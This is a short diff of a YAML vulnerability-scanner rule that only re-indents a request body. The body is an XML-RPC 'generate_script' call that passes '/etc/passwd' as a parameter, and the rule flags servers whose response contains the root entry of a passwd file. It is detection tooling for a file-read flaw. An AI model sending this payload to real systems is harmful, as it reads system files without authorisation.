@@ -21,7 +21,7 @@ rules:
       headers:
         Content-Type: text/xml
         Accept-Encoding: gzip
-    body: |
-      <?xml version='1.0'?><methodCall><methodName>generate_script</methodName><params><param><value><string>windows10</string></value></param><param><value><string></string></value></param><param><value><string>/etc/passwd</string></value></param></params></methodCall>
+      body: |
+        <?xml version='1.0'?><methodCall><methodName>generate_script</methodName><params><param><value><string>windows10</string></value></param><param><value><string></string></value></param><param><value><string>/etc/passwd</string></value></param></params></methodCall>
     expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0()
